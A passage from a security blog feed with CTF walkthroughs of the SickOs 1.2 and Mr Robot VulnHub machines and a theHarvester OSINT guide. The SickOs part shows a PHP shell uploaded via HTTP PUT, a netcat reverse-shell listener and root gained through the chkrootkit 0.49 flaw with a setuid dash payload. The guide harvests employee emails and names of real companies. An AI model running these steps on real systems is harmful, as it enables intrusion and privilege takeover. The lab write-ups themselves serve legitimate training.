<p>I tried constructing a path out of the comment, but didn&rsquo;t get anywhere. Searching for an exploit for the lighttpd server version didn&rsquo;t yield anything either, although I found some for other versions.</p>

<p>Back to the empty directory, I found it strange that there would be an innocuous empty folder on the web server, and I thought it might hint to making it..not empty by uploading something there :&ndash;) I was at a loss on how to do that with no attack vectors, but then I remembered that uploading something on a server doesn&rsquo;t always require sophisticated mechanisms and PHP vulnerabilities and the like. It&rsquo;s just as simple as using a certain HTTP method that you don&rsquo;t see too often: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT">PUT</a></p>

<p>First, I needed to verify if PUT is allowed in the first place:</p>

<p><code>
nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.217.146
PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
|_  Path tested: /test
</code></p>

<p>Excellent! I proceeded to upload a PHP shell with curl,but I got some weird expectation failed errors. Luckily, Nmap also has a script for PUT'ing things on a server:</p>

<p>```
nmap -p 80 192.168.217.146 &mdash;script http-put &mdash;script-args http-put.url=&lsquo;/test/shell.php&rsquo;,http-put.file=&lsquo;/root/Desktop/shell.php&rsquo;</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-04 04:36 EDT
Nmap scan report for 192.168.217.146
Host is up (0.00031s latency).
PORT   STATE SERVICE
80/tcp open  http
|_http-put: /test/shell.php was successfully created
```</p>

<p>All didn&rsquo;t work well, though. I usually use 8888 for my reverse shells, but this time I got nothing. I tried port 80, and still no joy. It seems that only port 443 is allowed. I looked at other walkthroughs for this, so I&rsquo;m not sure how you could determine it otherwise besides trial and error. But when I changed to the correct port, I got the shell:</p>

<p><code>
nc -vnlp 443
listening on [any] 443 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.146] 49769
Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 01:48:24 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
</code></p>

<p>Next, I did some enumeration. The usual culprits didn&rsquo;t stand out, and the permissions on this shell were pretty limited, but I did find something interesting pertaining to cron:</p>

<p>```
$ ls -al /etc/cron*
-rw-r&mdash;r&mdash; 1 root root  722 Jun 19  2012 /etc/crontab</p>

<p>ls: cannot open directory /etc/cron.d: Permission denied
/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 Apr 12  2016 .
drwxr-xr-x 84 root root  4096 Jul  4 00:10 ..
-rw-r&mdash;r&mdash;  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
```</p>

<p>The entry that got my attention was the chkrootkit one. chkrootkit is a tool that checks for rootkits on the system. I googled for possible exploits, and I did find <a href="https://www.exploit-db.com/exploits/33899/">one</a> right away. The vulnerable version is 0.49. I checked which version is installed on the system:</p>

<p><code>
$ chkrootkit -V
chkrootkit version 0.49
</code></p>

<p>Well, well! The exploit leverages exactly the case here, vulnerable chkrootkit running as root, courtesy of the cron job. The step to compromise the system is to put an executable file named &lsquo;update&rsquo; with non-root owner in /tmp</p>

<p>So, my idea was to give myself privileges to run an existing shell as root. I looked at what shells are installed on the system:</p>

<p>```
$ cat /etc/shells</p>

<h1>/etc/shells: valid login shells</h1>

<p>/bin/sh
/bin/dash
/bin/bash
/bin/rbash
$ ls -l /bin/*sh
-rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash
-rwxr-xr-x 1 root root 100284 Mar 29  2012 /bin/dash
lrwxrwxrwx 1 root root      4 Mar 28  2013 /bin/rbash &ndash;> bash
lrwxrwxrwx 1 root root      4 Mar 29  2012 /bin/sh &ndash;> dash
lrwxrwxrwx 1 root root      7 Nov 16  2012 /bin/static-sh &ndash;> busybox
```</p>

<p>I wasted almost an hour next, because the non-interactive shell gave me grief and prevented things from working properly. I started with bash and made it suid and ran it, but it didn&rsquo;t work. What worked was making dash suid and also spawning a TTY shell with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</code>.</p>

<p>Inside the update file, I just made <em>/bin/dash</em> suid:</p>

<p>```
$ cat update</p>

<h1>!/bin/bash</h1>

<p>chmod u+s /bin/dash
```</p>

<p>Then I waited a minute for cron to run and got root:</p>

<p>```
$ /bin/dash
/bin/dash</p>

<h1>whoami</h1>

<p>whoami
root
```</p>

<p>Besides the flag, in the root directory there was rule file for iptables that explained the VM&rsquo;s behavior. Anyway, here&rsquo;s the flag:</p>

<p>```</p>

<h1>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</h1>

<p>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
WoW! If you are viewing this, You have &ldquo;Sucessfully!!&rdquo; completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</p>

<p>Thanks for giving this try.</p>

<p>@vulnhub: Thanks for hosting this UP!.
```</p>

<p>This machine was challenging in the way it limited you to only certain actions. Damn, the first thing I will do from now on when getting a limited shell is spawn a TTY!!!</p>

<p>```</p>

<hr />

<p>/ Tomorrow will be cancelled due to lack \
\ of interest.                           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[TheHarvester - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/02/theharvester-kali-linux-tools/"/>
    <updated>2017-07-02T08:32:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/02/theharvester-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to perform OSINT recon on a target and aggregate information from different sources. TheHarvester is an e-mail, subdomain and people names harvester written in Python.</p>

<p>Homepage: <a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p>

<!-- more -->


<h2>theharvester description</h2>

<blockquote><p>theHarvester is a tool for gathering e-mail accounts, subdomain names, virtual
hosts, open ports/ banners, and employee names from different public sources
(search engines, pgp key servers).</p>

<p>Is a really simple tool, but very effective for the early stages of a penetration
test or just to know the visibility of your company in the Internet.</p>

<p>The sources are:</p>

<p>Passive:</p>

<p>-google: google search engine  &ndash; www.google.com</p>

<p>-googleCSE: google custom search engine</p>

<p>-google-profiles: google search engine, specific search for Google profiles</p>

<p>-bing: microsoft search engine  &ndash; www.bing.com</p>

<p>-bingapi: microsoft search engine, through the API (you need to add your Key in the discovery/bingsearch.py file)</p>

<p>-dogpile: Dogpile search engine &ndash; www.dogpile.com</p>

<p>-pgp: pgp key server &ndash; mit.edu</p>

<p>-linkedin: google search engine, specific search for Linkedin users</p>

<p>-vhost: Bing virtual hosts search</p>

<p>-twitter: twitter accounts related to an specific domain (uses google search)</p>

<p>-googleplus: users that works in target company (uses google search)</p>

<p>-yahoo: Yahoo search engine</p>

<p>-baidu: Baidu search engine</p>

<p>-shodan: Shodan Computer search engine, will search for ports and banner of the
discovered hosts  (<a href="http://www.shodanhq.com/">http://www.shodanhq.com/</a>)</p>

<p>Active:</p>

<p>-DNS brute force: this plugin will run a dictionary brute force enumeration</p>

<p>-DNS reverse lookup: reverse lookup of ip´s discovered in order to find hostnames</p>

<p>-DNS TDL expansion: TLD dictionary brute force enumeration</p>

<p>Modules that need API keys to work:</p>

<p>-googleCSE: You need to create a Google Custom Search engine(CSE), and add your
Google API key and CSE ID in the plugin (discovery/googleCSE.py)</p>

<p>-shodan: You need to provide your API key in discovery/shodansearch.py</p></blockquote>

<h2>theharvester options</h2>

<p>```</p>

<hr />

<ul>
<li><pre><code>                                                          *
</code></pre></li>
<li>| |<em>| |<strong>   </strong></em>    /\  /_<em> _ _ </em><strong><em>   </em></strong><strong>  </strong><em>| |</em> <strong>_ _ </strong>  *</li>
<li>| <strong>| &lsquo;<em> \ / _ \  / /</em>/ / _` | &rsquo;</strong>\ \ / / _ \/ <strong>| </strong>/ _ \ &lsquo;__| *</li>
<li>| |<em>| | | |  <strong>/ / </strong>  / (</em>| | |   \ V /  <strong>/__ \ ||  </strong>/ |    *</li>
<li>_<em>|</em>| |<em>|___| \/ /</em>/ _<em>,</em>|<em>|    _/ _<strong>||</strong></em>/_<em>___|</em>|    *</li>
<li><pre><code>                                                          *
</code></pre></li>
<li>TheHarvester Ver. 2.7                                           *</li>
<li>Coded by Christian Martorella                                   *</li>
<li>Edge-Security Research                                          *</li>
<li><a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#99;&#x6d;&#x61;&#x72;&#116;&#x6f;&#x72;&#101;&#108;&#108;&#x61;&#64;&#x65;&#100;&#103;&#101;&#x2d;&#115;&#101;&#x63;&#117;&#x72;&#105;&#116;&#x79;&#46;&#99;&#x6f;&#109;">&#99;&#109;&#97;&#x72;&#116;&#x6f;&#114;&#x65;&#108;&#108;&#x61;&#64;&#x65;&#100;&#x67;&#x65;&#45;&#115;&#101;&#99;&#117;&#x72;&#x69;&#x74;&#x79;&#x2e;&#99;&#x6f;&#x6d;</a>                                   *</li>
</ul>


<hr />

<p>Usage: theharvester options</p>

<pre><code>   -d: Domain to search or company name
   -b: data source: google, googleCSE, bing, bingapi, pgp, linkedin,
                    google-profiles, jigsaw, twitter, googleplus, all

   -s: Start in result number X (default: 0)
   -v: Verify host name via dns resolution and search for virtual hosts
   -f: Save the results into an HTML and XML file (both)
   -n: Perform a DNS reverse query on all ranges discovered
   -c: Perform a DNS brute force for the domain name
   -t: Perform a DNS TLD expansion discovery
   -e: Use this DNS server
   -l: Limit the number of results to work with(bing goes from 50 to 50 results,
        google 100 to 100, and pgp doesn't use this option)
   -h: use SHODAN database to query discovered hosts
</code></pre>

<p>Examples:</p>

<pre><code>    theharvester -d microsoft.com -l 500 -b google -h myresults.html
    theharvester -d microsoft.com -b pgp
    theharvester -d microsoft -l 200 -b linkedin
    theharvester -d apple.com -b googleCSE -l 500 -s 300
</code></pre>

<p>```</p>

<h2>theharvester usage</h2>

<ul>
<li>search with all options for a given domain</li>
</ul>


<p>```
theharvester -d hackerone.com -l 200 -b all -f harvested</p>

<hr />

<ul>
<li><pre><code>                                                          *
</code></pre></li>
<li>| |<em>| |<strong>   </strong></em>    /\  /_<em> _ _ </em><strong><em>   </em></strong><strong>  </strong><em>| |</em> <strong>_ _ </strong>  *</li>
<li>| <strong>| &lsquo;<em> \ / _ \  / /</em>/ / _` | &rsquo;</strong>\ \ / / _ \/ <strong>| </strong>/ _ \ &lsquo;__| *</li>
<li>| |<em>| | | |  <strong>/ / </strong>  / (</em>| | |   \ V /  <strong>/__ \ ||  </strong>/ |    *</li>
<li>_<em>|</em>| |<em>|___| \/ /</em>/ _<em>,</em>|<em>|    _/ _<strong>||</strong></em>/_<em>___|</em>|    *</li>
<li><pre><code>                                                          *
</code></pre></li>
<li>TheHarvester Ver. 2.7                                           *</li>
<li>Coded by Christian Martorella                                   *</li>
<li>Edge-Security Research                                          *</li>
<li><a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#99;&#x6d;&#97;&#114;&#x74;&#111;&#114;&#x65;&#108;&#108;&#97;&#64;&#101;&#x64;&#103;&#101;&#45;&#x73;&#x65;&#99;&#117;&#x72;&#x69;&#x74;&#121;&#x2e;&#x63;&#x6f;&#109;">&#99;&#x6d;&#x61;&#x72;&#x74;&#x6f;&#114;&#x65;&#108;&#x6c;&#x61;&#64;&#101;&#x64;&#103;&#x65;&#45;&#115;&#x65;&#x63;&#x75;&#x72;&#105;&#116;&#x79;&#x2e;&#99;&#111;&#109;</a>                                   *</li>
</ul>


<hr />

<p>Full harvest..
[&ndash;] Searching in Google..</p>

<pre><code>Searching 0 results...
Searching 100 results...
Searching 200 results...
</code></pre>

<p>[&ndash;] Searching in PGP Key server..
[&ndash;] Searching in Bing..</p>

<pre><code>Searching 50 results...
Searching 100 results...
Searching 150 results...
Searching 200 results...
</code></pre>

<p>[&ndash;] Searching in Exalead..</p>

<pre><code>Searching 50 results...
Searching 100 results...
Searching 150 results...
Searching 200 results...
Searching 250 results...
</code></pre>

<h2>[+] Emails found:</h2>

<p><a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x66;&#101;&#x65;&#x64;&#x62;&#x61;&#x63;&#x6b;&#64;&#x68;&#97;&#99;&#x6b;&#101;&#114;&#111;&#x6e;&#101;&#46;&#99;&#x6f;&#109;">&#102;&#101;&#x65;&#x64;&#98;&#97;&#99;&#107;&#64;&#x68;&#97;&#x63;&#107;&#x65;&#114;&#x6f;&#x6e;&#x65;&#46;&#x63;&#x6f;&#x6d;</a>
<a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x73;&#x75;&#112;&#x70;&#x6f;&#x72;&#x74;&#x40;&#x68;&#x61;&#x63;&#x6b;&#x65;&#114;&#x6f;&#x6e;&#x65;&#x2e;&#99;&#111;&#x6d;">&#x73;&#x75;&#x70;&#x70;&#x6f;&#114;&#116;&#64;&#104;&#x61;&#x63;&#x6b;&#x65;&#114;&#111;&#110;&#101;&#x2e;&#99;&#x6f;&#109;</a>
[REDACTED}</p>

<h2>[+] Hosts found in search engines:</h2>

<p>[&ndash;] Resolving hostnames IPs&hellip;
162.159.0.31:a.ns.hackerone.com
104.16.13.26:support.hackerone.com
104.16.99.52:www.hackerone.com</p>

<h1>[+] Virtual hosts:</h1>

<p>104.16.13.26    support.hackerone
104.16.13.26    support.hackerone.com
104.16.99.52    hackerone
[+] Saving files&hellip;
Files saved!
```</p>

<p>Keep in mind that I&rsquo;m editing some results from the output for privacy reasons. I&rsquo;m also saving all results in HTML</p>

<ul>
<li>Linkedin enumeration</li>
</ul>


<p>```
theharvester -d cisco.com -b linkedin -l 100 -f cisco</p>

<hr />

<ul>
<li><pre><code>                                                          *
</code></pre></li>
<li>| |<em>| |<strong>   </strong></em>    /\  /_<em> _ _ </em><strong><em>   </em></strong><strong>  </strong><em>| |</em> <strong>_ _ </strong>  *</li>
<li>| <strong>| &lsquo;<em> \ / _ \  / /</em>/ / _` | &rsquo;</strong>\ \ / / _ \/ <strong>| </strong>/ _ \ &lsquo;__| *</li>
<li>| |<em>| | | |  <strong>/ / </strong>  / (</em>| | |   \ V /  <strong>/__ \ ||  </strong>/ |    *</li>
<li>_<em>|</em>| |<em>|___| \/ /</em>/ _<em>,</em>|<em>|    _/ _<strong>||</strong></em>/_<em>___|</em>|    *</li>
<li><pre><code>                                                          *
</code></pre></li>
<li>TheHarvester Ver. 2.7                                           *</li>
<li>Coded by Christian Martorella                                   *</li>
<li>Edge-Security Research                                          *</li>
<li><a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#99;&#109;&#x61;&#x72;&#x74;&#111;&#114;&#101;&#108;&#108;&#x61;&#64;&#101;&#100;&#103;&#x65;&#x2d;&#115;&#101;&#x63;&#117;&#114;&#105;&#116;&#x79;&#x2e;&#x63;&#x6f;&#x6d;">&#x63;&#x6d;&#x61;&#x72;&#116;&#x6f;&#x72;&#101;&#x6c;&#x6c;&#97;&#64;&#101;&#x64;&#103;&#x65;&#x2d;&#x73;&#101;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#46;&#99;&#x6f;&#x6d;</a>                                   *</li>
</ul>


<hr />

<p>[&ndash;] Searching in Linkedin..</p>

<pre><code>Searching 100 results..
</code></pre>

<h1>Users from Linkedin:</h1>

<p>Name
Another name
Names
Names everywhere
```</p>

<ul>
<li>Twitter enumeration</li>
</ul>


<p>```
theharvester -d chousensha.github.io -l 10 -b twitter</p>

<hr />

<ul>
<li><pre><code>                                                          *
</code></pre></li>
<li>| |<em>| |<strong>   </strong></em>    /\  /_<em> _ _ </em><strong><em>   </em></strong><strong>  </strong><em>| |</em> <strong>_ _ </strong>  *</li>
<li>| <strong>| &lsquo;<em> \ / _ \  / /</em>/ / _` | &rsquo;</strong>\ \ / / _ \/ <strong>| </strong>/ _ \ &lsquo;__| *</li>
<li>| |<em>| | | |  <strong>/ / </strong>  / (</em>| | |   \ V /  <strong>/__ \ ||  </strong>/ |    *</li>
<li>_<em>|</em>| |<em>|___| \/ /</em>/ _<em>,</em>|<em>|    _/ _<strong>||</strong></em>/_<em>___|</em>|    *</li>
<li><pre><code>                                                          *
</code></pre></li>
<li>TheHarvester Ver. 2.7                                           *</li>
<li>Coded by Christian Martorella                                   *</li>
<li>Edge-Security Research                                          *</li>
<li><a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x63;&#x6d;&#x61;&#114;&#x74;&#x6f;&#114;&#x65;&#108;&#108;&#97;&#x40;&#101;&#100;&#x67;&#x65;&#x2d;&#115;&#x65;&#x63;&#117;&#x72;&#105;&#116;&#x79;&#46;&#x63;&#111;&#109;">&#x63;&#x6d;&#x61;&#x72;&#116;&#111;&#114;&#101;&#108;&#x6c;&#97;&#x40;&#101;&#100;&#x67;&#101;&#x2d;&#115;&#101;&#x63;&#x75;&#x72;&#105;&#x74;&#x79;&#46;&#99;&#x6f;&#x6d;</a>                                   *</li>
</ul>


<hr />

<p>[&ndash;] Searching in Twitter ..</p>

<pre><code>Searching 100 results..
</code></pre>

<h1>Users from Twitter:</h1>

<p>@-moz-keyframes gb<strong>a
@keyframes gb</strong>a
@-moz-keyframes gb<strong>nb
@keyframes gb</strong>nb
@media
@keyframes qli-container-rotate
@keyframes qli-fill-unfill-rotate
@keyframes qli-blue-fade-in-out
@keyframes qli-red-fade-in-out
@keyframes qli-yellow-fade-in-out
@keyframes qli-green-fade-in-out
@keyframes qli-left-spin
@keyframes qli-right-spin
@kalilinux load balancer detector &hellip;
@chous3nsha
@
```</p>

<ul>
<li>sample HTML output</li>
</ul>


<p><img class="center" src="/images/tools/harvester.png" title="&lsquo;theharvester&rsquo; &lsquo;theharvester HTML report&rsquo;" ></p>

<p>Also note that doing a reverse query on the discovered ranges takes long and the output might be overwhelming.</p>

<p>```</p>

<hr />

<p>/ In India, &ldquo;cold weather&rdquo; is merely a    \
| conventional phrase and has come into   |
| use through the necessity of having     |
| some way to distinguish between weather |
| which will melt a brass door-knob and   |
| weather which will only make it mushy.  |
|                                         |
\ &mdash; Mark Twain                           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Owning Mr Robot]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/01/owning-mr-robot/"/>
    <updated>2017-07-01T04:46:24-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/01/owning-mr-robot</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target was inspired by the Mr Robot series. The goal is to find 3 hidden flags.</p>

<!-- more -->


<p>I used Masscan to grab the open ports, which I then passed to Nmap:</p>

<p>```
masscan -p1-65535 &mdash;banners 192.168.217.145 &mdash;rate=10000</p>

<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-07-01 08:49:44 GMT
 &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 443/tcp on 192.168.217.145                              <br/>
Discovered open port 80/tcp on 192.168.217.145</p>

<p>nmap -T4 -p80,443 -A 192.168.217.145
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|<em>http-server-header: Apache
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
443/tcp open  ssl/http Apache httpd
|<em>http-server-header: Apache
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```</p>

<p>Just a web server. However, this doesn&rsquo;t look like your regular web app:</p>

<p><img class="center" src="/images/pentest/mr-robot/fsociety.png" title="&lsquo;fsociety&rsquo; &lsquo;fsociety login&rsquo;" ></p>

<p>Interesting, we are in contact with fsociety! I ran each command (type help to see them listed at any time), and here&rsquo;s what we have so far:</p>

<ul>
<li><p>prepare &ndash; a video that ends with an address that warrants checking: whoismrrobot.com</p></li>
<li><p>fsociety &ndash; a CLI animation that asks if you are ready to join</p></li>
<li><p>inform &ndash; a series of news that reveal the hypocrisy of today&rsquo;s (is it really made up?) society</p></li>
</ul>


<p><img class="center" src="/images/pentest/mr-robot/deflated.png" title="&lsquo;sports scandal&rsquo; &lsquo;sports scandal&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/space.png" title="&lsquo;space rocket&rsquo; &lsquo;space rocket&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/meast.png" title="&lsquo;middle east&rsquo; &lsquo;middle east&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/gala.png" title="&lsquo;gala&rsquo; &lsquo;celebrity gala&rsquo;" ></p>

<ul>
<li>question &ndash; more pictures with hard to accept truths</li>
</ul>


<p><img class="center" src="/images/pentest/mr-robot/america.png" title="&lsquo;patriot&rsquo; &lsquo;american dream&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/executive.png" title="&lsquo;executive&rsquo; &lsquo;executive stealing&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/capitalist.png" title="&lsquo;capitalism&rsquo; &lsquo;capitalism&rsquo;" ></p>

<p><img class="center" src="/images/pentest/mr-robot/bzns.png" title="&lsquo;business&rsquo; &lsquo;business&rsquo;" ></p>

<ul>
<li><p>wakeup &ndash; shows some high level executives arguing in a skyscraper</p></li>
<li><p>join &ndash; fsociety requests your mail address to keep in touch</p></li>
</ul>


<p><img class="center" src="/images/pentest/mr-robot/mail.png" title="&lsquo;enter your mail&rsquo; &lsquo;enter your mail&rsquo;" ></p>

<p>Alright, we had some fun. Now I checked that URL I mentioned earlier for more breadcrumbs:</p>

<p><img class="center" src="/images/pentest/mr-robot/whois.png" title="&lsquo;whois mr robot&rsquo; &lsquo;whois mr robot&rsquo;" ></p>

<p>You can click on the GUI, look around, play some games. There are also some commands you can run in the terminal:</p>

<ul>
<li><p>fsociety_endgame &ndash; launches a game that you might want to discover for yourself</p></li>
<li><p>massacre &ndash; launches a movie, but I got a message that content is not available to my location</p></li>
<li><p>elliot &ndash; shows a GIF</p></li>
<li><p>fivenine &ndash; looks like a collection of clips related to the Five-Nine attack</p></li>
<li><p>restart &ndash; another scene from the series</p></li>
<li><p>join &ndash; get in touch with Mr Robot</p></li>
<li><p>archive &ndash; shows some of the above commands</p></li>
</ul>


<h2>Flag #1</h2>

<p>When running the commands, you probably noticed that the web path changes to <code>URL/cmdname</code>. I looked for robots.txt, and it looks like Mr Robot isn&rsquo;t the only robot around:</p>

<p><code>
User-agent: *
fsocity.dic
key-1-of-3.txt
</code></p>

<p>We&rsquo;ve found the first flag: <code>073403c8a58a1f80d943455fb30724b9</code></p>

<p>The other things looks like a dictionary file with various strings. Maybe it will come in handy later.</p>

<p>Continuing the web recon, I decided to use a tool that I haven&rsquo;t used before: uniscan!</p>

<h3>uniscan description</h3>

<p>Homepage: <a href="https://sourceforge.net/projects/uniscan/">https://sourceforge.net/projects/uniscan/</a></p>

<blockquote><p>Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p></blockquote>

<p>This tool comes in both CLI and GUI form. The GUI interface is plain and simple:</p>

<p><img class="center" src="/images/pentest/mr-robot/uniscan-gui.png" title="&lsquo;uniscan-gui&rsquo; &lsquo;uniscan gui&rsquo;" ></p>

<h3>uniscan options</h3>

<p>```</p>

<h6>#</h6>

<h1>Uniscan project</h1>

<h1><a href="http://uniscan.sourceforge.net/">http://uniscan.sourceforge.net/</a></h1>

<h6>#</h6>

<ol type="a">
<li>6.3</li>
</ol>


<p>OPTIONS:</p>

<pre><code>-h  help
-u  &lt;url&gt; example: https://www.example.com/
-f  &lt;file&gt; list of url's
-b  Uniscan go to background
-q  Enable Directory checks
-w  Enable File checks
-e  Enable robots.txt and sitemap.xml check
-d  Enable Dynamic checks
-s  Enable Static checks
-r  Enable Stress checks
-i  &lt;dork&gt; Bing search
-o  &lt;dork&gt; Google search
-g  Web fingerprint
-j  Server fingerprint
</code></pre>

<p>usage:
[1] perl ./uniscan.pl -u <a href="http://www.example.com/">http://www.example.com/</a> -qweds
[2] perl ./uniscan.pl -f sites.txt -bqweds
[3] perl ./uniscan.pl -i uniscan
[4] perl ./uniscan.pl -i &ldquo;ip:xxx.xxx.xxx.xxx&rdquo;
[5] perl ./uniscan.pl -o &ldquo;inurl:test&rdquo;
[6] perl ./uniscan.pl -u <a href="https://www.example.com/">https://www.example.com/</a> -r
```</p>

<p>I ran the CLI tool against the target with most of the flags. While described as simple, it checks for plenty of things: Drupal plugins, mobile versions, error message information, interesting HTML strings, performs whois and nslookup lookups, attempts banner grabbing, runs ping, traceroute and Nmap against the target, looks for some specific issues, and more:</p>

<p>```
Crawler Started:
| Plugin name: FCKeditor upload test v.1 Loaded.
| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
| Plugin name: Upload Form Detect v.1.1 Loaded.
| Plugin name: phpinfo() Disclosure v.1 Loaded.
| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
| Plugin name: Code Disclosure v.1.1 Loaded.
| Plugin name: E-mail Detection v.1.1 Loaded.
| Plugin name: External Host Detect v.1.2 Loaded.
| [+] Crawling finished, 59 URL&rsquo;s found!</p>

<p>Dynamic tests:
| Plugin name: Learning New Directories v.1.2 Loaded.
| Plugin name: FCKedior tests v.1.1 Loaded.
| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
| Plugin name: Find Backup Files v.1.2 Loaded.
| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.2 Loaded.
| Plugin name: SQL-injection tests v.1.2 Loaded.
| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
| Plugin name: Web Shell Finder v.1.3 Loaded.
```</p>

<p>And the tool did find some useful information for further compromising the target!</p>

<h1>``` </h1>

<p>|
| Directory check:
| [+] CODE: 200 URL: <a href="http://192.168.217.145/Image/">http://192.168.217.145/Image/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/">http://192.168.217.145/admin/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/feed/">http://192.168.217.145/feed/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/image/">http://192.168.217.145/image/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/login/">http://192.168.217.145/login/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/rss/">http://192.168.217.145/rss/</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/wp-login/">http://192.168.217.145/wp-login/</a></p>

<h1>| [+] CODE: 200 URL: <a href="http://192.168.217.145/wp-admin/">http://192.168.217.145/wp-admin/</a></h1>

<p>|                                                                                                 <br/>
| File check:
| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/index.html">http://192.168.217.145/admin/index.html</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/index.php">http://192.168.217.145/admin/index.php</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/favicon.ico">http://192.168.217.145/favicon.ico</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.html">http://192.168.217.145/index.html</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.html%20">http://192.168.217.145/index.html%20</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.php">http://192.168.217.145/index.php</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/license.txt">http://192.168.217.145/license.txt</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/readme.html">http://192.168.217.145/readme.html</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/readme">http://192.168.217.145/readme</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/robots.txt">http://192.168.217.145/robots.txt</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/htx/sqlqhit.asp">http://192.168.217.145/search/htx/sqlqhit.asp</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/htx/SQLQHit.asp">http://192.168.217.145/search/htx/SQLQHit.asp</a>
